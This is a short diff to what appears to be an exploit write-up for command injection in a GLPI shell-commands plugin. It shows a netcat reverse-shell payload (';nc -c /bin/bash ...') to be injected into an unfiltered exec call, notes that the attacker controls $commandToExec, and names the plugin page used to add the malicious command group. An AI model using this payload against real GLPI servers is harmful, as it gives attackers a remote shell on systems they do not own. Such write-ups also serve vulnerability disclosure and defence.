@@ -35,6 +35,11 @@ You can use this payload for reverse shell :
 ;nc -c /bin/bash localhost 1234
 ```
 
+It is simply an "exec" of all the arguments there are no filters<br>
+We control the variable $commandToExec
+
+![image](https://user-images.githubusercontent.com/69597623/189349689-45af6cd0-9611-4a85-b561-4219da114738.png)
+
 ![](https://i.imgur.com/0vuQnGF.png)
 
 Add a ping command group : ``/glpi/marketplace/shellcommands/front/commandgroup.php``
